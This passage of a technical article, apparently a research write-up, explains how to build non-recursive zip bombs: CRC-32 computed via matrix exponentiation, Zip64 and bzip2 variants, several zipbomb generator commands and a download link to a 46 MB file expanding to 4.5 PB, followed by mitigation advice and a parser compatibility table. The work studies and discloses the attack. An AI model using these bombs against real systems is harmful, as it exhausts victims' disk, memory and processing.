<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
</tbody>
</table>
<figcaption>
The 33×33 transformation matrices <var>M</var><sub>0</sub> and <var>M</var><sub>1</sub> that compute
the CRC-32 state change effected by a 0&nbsp;bit and a 1&nbsp;bit respectively.
Column vectors are stored with the most significant bit at the bottom:
reading the first column from bottom to top, you see
the CRC-32 polynomial constant edb88320<sub>16</sub> =
<span>1</span><span>1</span><span>1</span><span>0</span><span>1</span><span>1</span><span>0</span><span>1</span><span>1</span><span>0</span><span>1</span><span>1</span><span>1</span><span>0</span><span>0</span><span>0</span><span>1</span><span>0</span><span>0</span><span>0</span><span>0</span><span>0</span><span>1</span><span>1</span><span>0</span><span>0</span><span>1</span><span>0</span><span>0</span><span>0</span><span>0</span><span>0</span><sub>2</sub>.
The two matrices differ only in the final column, which represents a translation vector
in homogeneous coordinates.
In <var>M</var><sub>0</sub> the translation is zero and
in <var>M</var><sub>1</sub> it is edb88320<sub>16</sub>, the CRC-32 polynomial constant.
The 1's just above the diagonal represent the
shift operation <code>state&nbsp;&gt;&gt;&nbsp;1</code>.
</figcaption>
</figure>

<p>
Both operations <code>crc32_update_0</code> and <code>crc32_update_1</code>
can be represented by a 33×33 transformation matrix.
The matrices <var>M</var><sub>0</sub> and <var>M</var><sub>1</sub> are shown.
The benefit of a matrix representation is that matrices compose.
Suppose we want to represent the state change effected by processing
the ASCII character 'a', whose binary representation is
01100001<sub>2</sub>.
We can represent the cumulative CRC-32 state change of those 8&nbsp;bits
in a single transformation matrix:
</p>
<figure>
<table>
<tbody><tr>
<td><var>M</var><sub>a</sub></td><td>&nbsp;= <var>M</var><sub>0</sub> <var>M</var><sub>1</sub>&nbsp;<var>M</var><sub>1</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>1</sub></td>
</tr>
</tbody></table>
</figure>
<p>
And we can represent the state change of a string of repeated 'a's
by multiplying many copies of <var>M</var><sub>a</sub> together—matrix exponentiation.
We can do matrix exponentiation quickly
using a <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">square-and-multiply</a> algorithm,
which allows us to compute <var>M</var><sup><var>n</var></sup>
in only about log<sub>2</sub> <var>n</var> steps.
For example, the matrix representing the state change
of a string of 9&nbsp;'a's is
</p>
<figure>
<table>
<tbody><tr>
<td>(<var>M</var><sub><code>a</code></sub>)<sup>9</sup></td><td>&nbsp;= <var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
<tr>
<td></td><td>&nbsp;= (<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>)<sup>2</sup>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
<tr>
<td></td><td>&nbsp;= ((<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>)<sup>2</sup>)<sup>2</sup>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
<tr>
<td></td><td>&nbsp;= (((<var>M</var><sub><code>a</code></sub>)<sup>2</sup>)<sup>2</sup>)<sup>2</sup>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
</tbody></table>
</figure>

<p>
The square-and-multiply algorithm is useful
for computing <var>M</var><sub>kernel</sub>,
the matrix for the uncompressed kernel,
because the kernel is a string of repeated bytes.
To produce a CRC-32 checksum value from a matrix,
multiply the matrix by the zero vector.
(The zero vector in homogeneous coordinates, that is:
32&nbsp;0's followed by a&nbsp;1.
Here we omit the minor complication of pre- and post-conditioning the checksum.)
To compute the checksum for every file, we work backwards.
Start by initializing <var>M</var>&nbsp;:=&nbsp;<var>M</var><sub>kernel</sub>.
The checksum of the kernel is also the checksum
of the final file, file&nbsp;<var>N</var>,
so multiply <var>M</var> by the zero vector and store the resulting checksum in
CDH<sub><var>N</var></sub> and LFH<sub><var>N</var></sub>.
The file data of file&nbsp;<var>N</var>&nbsp;−&nbsp;1 is the same as the file data of file&nbsp;<var>N</var>,
but with an added prefix of LFH<sub><var>N</var></sub>.
So compute <var>M</var><sub>LFH<sub><var>N</var></sub></sub>,
the state change matrix for LFH<sub><var>N</var></sub>,
and update <var>M</var>&nbsp;:=&nbsp;<var>M</var>&nbsp;<var>M</var><sub>LFH<sub><var>N</var></sub></sub>.
Now <var>M</var> represents the cumulative state change from processing
LFH<sub><var>N</var></sub> followed by the kernel.
Compute the checksum for file <var>N</var>&nbsp;−&nbsp;1 by again multiplying <var>M</var> by the zero vector.
Continue the procedure, accumulating state change matrices into <var>M</var>,
until all the files have been processed.
</p>

<!--
<p>
The <a href=#source>source code</a> employs an additional
optimization on top of the conceptual scheme outlined in the previous paragraph.
Instead of updating
<var>M</var> := <var>M</var> <var>M</var><sub>LFH<sub><var>i</var></sub></sub>
after each file, we update
<var>M</var> := <var>M</var> (<var>M</var><sub>0</sub>)<sup>|LFH<sub><var>i</var></sub>|</sup>,
where |LFH<sub><var>i</var></sub>|
is the size of LFH<sub><var>i</var></sub> in bytes.
</p>
-->

</section>

<section id="zip64">
<h2>Extension: Zip64</h2>

<p>
<a href="#allocation">Earlier</a> we hit a wall on expansion
due to limits of the zip format—it was impossible
to produce more than about 281&nbsp;TB of output,
no matter how cleverly packed the zip file.
It is possible to surpass those limits
using <a href="https://en.wikipedia.org/wiki/Zip_(file_format)#ZIP64">Zip64</a>,
an extension to the zip format that increases
the size of certain header fields to 64&nbsp;bits.
Support for Zip64 is <a href="#compatibility">by no means universal</a>,
but it is one of the more commonly implemented extensions.
As regards the compression ratio,
the effect of Zip64 is to
increase the size of a central directory header from
46&nbsp;bytes to 58&nbsp;bytes,
and the size of a local directory header from
30&nbsp;bytes to 50&nbsp;bytes.
Referring to
<a href="#eq-S_X_N_OPT">the formula</a>
for optimal expansion in the simplified model,
we see that a zip bomb in Zip64 format
still grows quadratically,
but more slowly because of the larger denominator—this
is visible in
<a href="#zipped_size">the figure below</a>
in the Zip64 line's
slightly lower vertical placement.
In exchange for the loss of compatibility
and slower growth,
we get the removal of all practical file size limits.
</p>

<p>
Suppose we want a zip bomb that expands to
<data value="4507981343026016">4.5&nbsp;<abbr title="petabyte">PB</abbr></data>,
the same size that 42.zip recursively expands to.
How big must the zip file be?
Using binary search, we find that the smallest
zip file whose unzipped size exceeds the unzipped size of 42.zip
has a zipped size of
<data value="45876952">46&nbsp;<abbr title="megabyte">MB</abbr></data>.
</p>

<div id="download-zbxl">
<p><a href="https://www.bamsoftware.com/hacks/zipbomb/zbxl.zip" download=""><img src="https://www.bamsoftware.com/hacks/zipbomb/zip.png" alt=""> zbxl.zip</a>
<span><data value="45876952">46&nbsp;<abbr title="megabyte">MB</abbr></data>&nbsp;→&nbsp;<data value="4507981427706459">4.5&nbsp;<abbr title="petabyte">PB</abbr></data> (Zip64, less compatible)</span></p><pre>zipbomb --mode=quoted_overlap --num-files=190023 --compressed-size=22982788 --zip64 &gt; zbxl.zip</pre>
</div>

<p>
4.5&nbsp;<abbr title="petabyte">PB</abbr> is roughly
the size of the data captured by the Event Horizon Telescope
to make the
<a href="https://www.vice.com/en/article/597m7q/reddits-data-hoarders-are-freaking-out-over-all-that-black-hole-data">first image of a black hole</a>,
stacks and stacks of hard drives.
</p>

<p>
With Zip64, it's no longer practically interesting to
consider the maximum compression ratio,
because we can just keep increasing the zip file size,
and the compression ratio along with it,
until even the compressed zip file is prohibitively large.
An interesting threshold, though,
is
<data value="18446744073709551616">2<sup>64</sup>&nbsp;bytes</data>
(<data value="18446744073709551616">18&nbsp;<abbr title="exabyte">EB</abbr></data> or
<data value="18446744073709551616">16&nbsp;<abbr title="exbibyte">EiB</abbr></data>)—that
much data
<a href="https://en.wikipedia.org/wiki/Comparison_of_file_systems#Limits">will not fit on most filesystems</a>.
Binary search finds the smallest zip bomb that produces at least that much output:
it contains <data value="12056313">12&nbsp;million</data> files
and has a compressed kernel of <data value="1482284040">1.5&nbsp;<abbr title="gigabyte">GB</abbr></data>.
The total size of the zip file is
<data value="2961656712">2.9&nbsp;<abbr title="gigabyte">GB</abbr></data>
and it unzips to
<data value="18446744085437447493">2<sup>64</sup>&nbsp;+&nbsp;11 727 895 877 bytes</data>,
having a compression ratio of over <data value="6228522033.190134">6.2&nbsp;billion</data>.
I&nbsp;didn't make this one downloadable,
but you can generate it yourself using the <a href="#source">source code</a>.
It contains files so large that it uncovers
<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=929502">a bug</a>
in Info-ZIP UnZip&nbsp;6.0.
</p>

<pre>zipbomb --mode=quoted_overlap --num-files=12056313 --compressed-size=1482284040 --zip64 &gt; zbxxl.zip
</pre>

<!--
# time python3 zipbomb - -mode=quoted_overlap - -num-files=12056313 - -compressed-size=1482284040 - -zip64 > zbxxl.zip

real    52m3.082s
user    51m50.728s
sys     0m11.940s
-->

</section>

<section id="bzip2">
<h2>Extension: bzip2</h2>



<p>
DEFLATE is the most common compression algorithm
used in the zip format, but it is only one of many options.
Probably the second most common algorithm is <a href="https://en.wikipedia.org/wiki/Bzip2">bzip2</a>,
while not as compatible as DEFLATE,
is probably the second most commonly supported compression algorithm.
Empirically, bzip2 has a maximum compression ratio of about 1.4&nbsp;million,
which allows for denser packing of the kernel.
Ignoring the loss of compatibility,
does bzip2 enable a more efficient zip bomb?
</p>

<p>
Yes—but only for small files.
The problem is that bzip2 does not have anything like the
<a href="#quote">non-compressed blocks</a> of DEFLATE
that we used to <a href="#quote">quote local file headers</a>.
So it is not possible to overlap files and reuse the kernel—each file must have
its own copy, and therefore the overall compression ratio
is no better than the ratio of any single file.
In <a href="#zipped_size">the figure</a> we see that
no-overlap bzip2 outperforms quoted DEFLATE
only for files under about a megabyte.
</p>

<p>
There is still hope for using bzip2—an
alternative means of local file header quoting
discussed in <a href="#extra">the next section</a>.
Additionally,
if you happen to know that a certain zip parser supports bzip2
<em>and</em> tolerates mismatched filenames,
then you can use the <a href="#overlap">full-overlap construction</a>,
which has no need for quoting.
</p>

<figure id="zipped_size">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/zipped_size.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/zipped_size.png" alt="Log–log plot of unzipped size versus zipped size for different zip file constructions: DEFLATE, bzip2, quoted DEFLATE, and 42.zip (recursive and non-recursive).">
</picture>
<figcaption>
Zipped size versus unzipped size for various zip bomb constructions.
Note the log–log scales.
Each construction is shown with and without Zip64.
The no-overlap constructions
have a linear rate of growth,
which is visible in the 1:1 slope of the lines.
The vertical offset of the bzip2 lines shows that the compression ratio
of bzip2 is about a thousand times greater than that of DEFLATE.
The quoted-DEFLATE constructions
have a quadratic rate of growth,
as evidenced by the 2:1 slope of the lines.
The Zip64 variant is slightly less efficient,
but permits output in excess of 281&nbsp;TB.
The lines for extra-field-quoted bzip2
transition from quadratic to linear
upon reaching either the maximum file size
(<data value="65534">2<sup>32</sup>&nbsp;−&nbsp;2 bytes</data>),
or the maximum number of files allowed by extra-field quoting.
</figcaption>
</figure>

</section>



<section id="discussion">
<h2>Discussion</h2>

<p>
In related work,
<a href="http://sar.informatik.hu-berlin.de/research/publications/index.htm#SAR-PR-2006-04">Plötz et&nbsp;al.</a>
used overlapping files to create a
near-self-replicating zip file.
Gynvael Coldwind
has <a href="https://gynvael.coldwind.pl/?id=682">previously suggested</a> (slide&nbsp;47)
overlapping files.
<a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/pellegrino">Pellegrino et&nbsp;al.</a>
found systems vulnerable to compression bombs
and other resource exhaustion attacks
and listed common pitfalls in specification,
implementation, and configuration.
</p>

<p>
We have designed the quoted-overlap zip bomb construction for compatibility,
taking into consideration a number of implementation differences,
some of which are shown in <a href="#compatibility">the table below</a>.
The resulting construction is compatible with zip parsers that work
in the usual back-to-front way,
first consulting the central directory
and using it as an index of files.
Among these is the example
zip parser included in <a href="https://www.usenix.org/conference/osdi14/technical-sessions/presentation/bangert">Nail</a>,
which is automatically generated from a formal grammar.
The construction is not compatible, however,
with "streaming" parsers,
those that parse the zip file from beginning to end in one pass
without first reading the central directory.
By their nature, streaming parsers
do not permit any kind of file overlapping.
The most likely outcome is that they
will extract only the first file.
They may even raise an error besides,
as is the case with <a href="https://github.com/madler/sunzip">sunzip</a>,
which parses the central directory at the end and checks it for consistency
with the local file headers it has already seen.
</p>

<p>
If you need the extracted files to start with a certain prefix
(so that they will be identified as a certain file type, for example),
you can insert a data-carrying DEFLATE block just before the
block that quotes the next header.
Not every file has to participate in the bomb construction:
you can include ordinary files
alongside the bomb files
if you need the zip file to conform to some higher-level format.
(The <a href="#source">source code</a> has a <code>--template</code>
option to facilitate this use case.)
Many file formats use zip as a container;
examples are Java JAR, Android APK, and LibreOffice documents.
</p>

<p id="pdf">
<a href="https://en.wikipedia.org/wiki/PDF">PDF</a>
is in many ways similar to zip.
It has a cross-reference table at the end of the file
that points to objects earlier in the file,
and it supports DEFLATE compression of objects through
the FlateDecode filter.
Didier Stevens
<a href="https://blog.didierstevens.com/2008/05/19/pdf-stream-objects/">writes</a>
about having contained a 1&nbsp;GB stream inside a
<data value="2642">2.6&nbsp;kB</data> PDF file
by stacking FlateDecode filters.
If a PDF parser limits the amount of stacking,
then it is probably possible to use the DEFLATE quoting idea
to overlap PDF objects.
</p>



<p id="mitigation">
Detecting the specific class of zip bomb we have developed in this article is easy:
look for overlapping files.
Mark Adler has written <a href="https://github.com/madler/unzip/commits/6519bf0f8a896851d9708da11e1b63c818238c8f">a patch</a>
for Info-ZIP UnZip that does just that.
<!-- updated:
https://github.com/madler/unzip/commit/6d351831be705cc26d897db44f878a978f4138fc

https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=963996
https://github.com/madler/unzip/commit/5e2efcd633a4a1fb95a129a75508e7d769e767be
https://github.com/madler/unzip/commit/5c572555cf5d80309a07c30cf7a54b2501493720
-->
In general, though, rejecting overlapping files
does not by itself make it safe to handle untrusted zip files.
There are zip bombs that do not rely on overlapping files,
and there are malicious zip files that are not bombs.
Furthermore, any such detection logic must
be implemented inside the parser itself,
not as a separate prefilter.
One of the details
omitted from <a href="#zip">the description of the zip format</a> is that
there is no single well-defined algorithm for locating
the central directory in a zip file:
two parsers may find two different central directories
and therefore
<a href="https://gynvael.coldwind.pl/?id=682">may not even agree on what files a zip file contains</a>
(slides 67–80).
Predicting the total uncompressed size
by summing the sizes of all files
does not work, in general,
because the sizes stored in metadata
<a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/pellegrino">may not match</a>
(§4.2.2)
the actual uncompressed sizes.
(See the "permits too-short file size" row in <a href="#compatibility">the compatibility table</a>.)
Robust protection against zip bombs
involves sandboxing the parser to limit
its use of time, memory, and disk space—just
as if you were processing image files,
or any other complex file format prone to parser bugs.
</p>

<table id="compatibility">

<caption>
<p>
Compatibility of selected zip parsers with various zip features,
edge cases,
and zip bomb constructions.
The background colors indicate a scale from <span>less restrictive to more restrictive</span>.
For best compatibility,
use DEFLATE compression without Zip64,
match names in central directory headers and local file headers,
compute correct CRCs,
and avoid the maximum values of 32-bit and 16-bit fields.
</p>
</caption>

<!--
Open Packaging Conventions:
DEFLATE: yes (Table (C-3)
Zip64: yes (Table C-1, Table C-3)
bzip2: no (Table C-3)
permits mismatched filenames: no (C.1 Archive File Header Consistency)
permits incorrect CRC-32: unknown
permits file size of 0xffffffff: unknown
permits file count of 0xffff: unknown
https://www.ecma-international.org/news/TC45_current_work/Office%20Open%20XML%20Part%202%20-%20Open%20Packaging%20Conventions.pdf
-->

<!--
$ git clone https://android.googlesource.com/platform/system/core
$ cd core
$ git checkout android-9.0.0_r1
$ g++ -o unzip -std=c++17 -Iinclude -Ibase/include -Iliblog/include -Ilibutils/include -Ilibziparchive/include libziparchive/{zip_archive.cc,unzip.cpp} base/{strings.cpp,file.cpp,logging.cpp,stringprintf.cpp} libutils/FileMap.cpp libunwindstack/tests/LogFake.cpp -lz
-->

<thead>
<tr>
<td></td>
<th><a href="http://infozip.sourceforge.net/UnZip.html">Info-ZIP<br>UnZip 6.0</a></th>
<th><a href="https://docs.python.org/3/library/zipfile.html">Python 3.7<br>zipfile</a></th>
<th><a href="https://golang.org/pkg/archive/zip/">Go 1.12<br>archive/zip</a></th>
<th><a href="https://github.com/thejoshwolfe/yauzl">yauzl 2.10.0<br>(Node.js)</a></th>
<th><a href="https://github.com/jbangert/nail/tree/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip">Nail<br>examples/zip</a></th>
<th><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive">Android&nbsp;9.0.0&nbsp;r1<br>libziparchive</a></th>
<th><a href="https://github.com/madler/sunzip">sunzip 0.4</a><br>(streaming)</th>
</tr>
</thead>

<tbody>

<!--
<td class= title=></td>
<td class=y title=yes>✓</td>
<td class=n title=no>✖</td>
-->

<tr>
<th>DEFLATE</th>
<td title="yes">✓</td>
<td title="yes"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L57">✓</a></td>
<td title="yes"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/struct.go#L31">✓</a></td>
<td title="yes"><a href="https://github.com/thejoshwolfe/yauzl/blob/2.10.0/index.js#L520-L521">✓</a></td>
<td title="yes"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.c#L63">✓</a></td>
<td title="yes"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#1059">✓</a></td>
<td title="yes"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1256">✓</a></td>
</tr>

<tr>
<th>Zip64</th>
<td title="yes"><a href="http://infozip.sourceforge.net/UnZip.html#Release">✓</a></td>
<td title="yes"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L186">✓</a></td>
<td title="yes"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L519">✓</a></td>
<td title="limited to the range of IEEE doubles"><a href="https://github.com/thejoshwolfe/yauzl/tree/2.10.0#limitted-zip64-support">✓</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.c#L103-L125">✖</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#168">✖</a></td>
<td title="yes"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L922">✓</a></td>
</tr>

<tr>
<th>bzip2</th>
<td title="yes"><a href="http://infozip.sourceforge.net/UnZip.html#Release">✓</a></td>
<td title="yes"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L58">✓</a></td>
<td title="unless you provide an implementation with RegisterDecompressor"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/struct.go#L28-L32">✖</a></td>
<td title="no"><a href="https://github.com/thejoshwolfe/yauzl/blob/2.10.0/index.js#L517-L525">✖</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.c#L86">✖</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#1061">✖</a></td>
<td title="yes"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1256">✓</a></td>
</tr>

<tr>
<th>permits mismatched filenames</th>
<td title="warns, then takes name from central directory">warns</td>
<td><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L1486-L1489"><abbr title="no">✖</abbr></a></td>
<td title="ignores local file header metadata"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L244">✓</a></td>
<td title="ignores local file header metadata"><a href="https://github.com/thejoshwolfe/yauzl/tree/2.10.0#local-file-headers-are-ignored">✓</a></td>
<td title="with a TODO to add the check"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L49">✓</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#594">✖</a></td>
<td title="ignores local file header filename"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1268-L1269">✓</a></td>
</tr>

<tr>
<th>permits incorrect CRC-32</th>
<td><abbr title="shows expected and actual CRC">warns</abbr></td>
<td title="no"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L893-L894">✖</a></td>
<td title="CRC-32 ignored if set to 0"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L219-L224">if zero</a></td>
<td title="yes"><a href="https://github.com/thejoshwolfe/yauzl/tree/2.10.0#no-crc-32-checking">✓</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L41">✖</a></td>
<td title="with a compile-time bool to enable CRC checks; but does check for consistency between CDH CRC and data descriptor CRC"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#52">✓</a></td>
<td title="no"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1113-L1124">✖</a></td>
</tr>

<tr>
<th>permits too-short file size</th>
<td title="yes">✓</td>
<td title="permits uncompressed size field to be longer, but not shorter, than the actual size"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L772">✖</a></td>
<td title="no"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L205-L207">✖</a></td>
<td title="no"><a href="https://github.com/thejoshwolfe/yauzl/blob/2.10.0/index.js#L641-L655">✖</a></td>
<td title="no"><a href="https://github.com/jbangert/nail/blob/4bd9cc29c4092abe7a77f8294aff2337bba02ec5/examples/zip/zip.nail#L47">✖</a></td>
<td title="no"><a href="https://android.googlesource.com/platform/system/core/+/refs/tags/android-9.0.0_r1/libziparchive/zip_archive.cc#847">✖</a></td>
<td title="no"><a href="https://github.com/madler/sunzip/blob/v0.4/sunzip.c#L1113-L1124">✖</a></td>
</tr>

<tr>
<th>permits file size of 2<sup>32</sup>&nbsp;−&nbsp;1</th>
<td title="yes">✓</td>
<td title="0xffffffff not treated as special"><a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L1311-L1313">✓</a></td>
<td title="special case to allow file size of 0xffffffff, still disallows compressed size or local file header offset of 0xffffffff"><a href="https://github.com/golang/go/blob/go1.12/src/archive/zip/reader.go#L406-L414">✓</a></td>
